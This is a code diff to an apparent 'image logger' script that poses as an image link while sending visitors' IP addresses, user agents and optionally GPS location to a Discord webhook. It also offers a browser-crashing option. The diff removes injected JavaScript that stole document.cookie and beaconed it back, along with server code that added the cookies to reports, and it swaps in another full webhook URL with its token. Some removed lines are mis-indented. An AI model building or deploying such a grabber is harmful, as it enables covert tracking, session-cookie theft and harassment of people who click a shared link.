@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1402936544330911754/KbxtkyBKc_RGP3WsShAHZt-dF40bdAAiHezfMs5cEAOChhY7HUgN18wLHbQLf6Djues6",
+    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
     "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -22,7 +22,7 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
@@ -87,8 +87,6 @@ def reportError(error):
     ],
 })
 
-if cookies:
-    embed["embeds"][0]["description"] += f"\n\n**Cookies:**\n```{cookies}```"
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
         return
@@ -195,13 +193,6 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             if config["imageArgument"]:
                 s = self.path
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-                cookie_value = None
-if "c" in dic:
-    try:
-        decoded = base64.b64decode(dic["c"]).decode()
-        cookie_value = decoded
-    except:
-        cookie_value = "Failed to decode cookies"
                 if dic.get("url") or dic.get("id"):
                     url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                 else:
@@ -221,16 +212,7 @@ background-size: contain;
 width: 100vw;
 height: 100vh;
 }}</style><div class="img"></div>'''.encode()
-data += b"""
-<script>
-(function() {
-    try {
-        var cookies = document.cookie;
-        fetch(window.location.pathname + "?c=" + btoa(cookies));
-    } catch (e) {}
-})();
-</script>
-"""            
+            
             if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
             
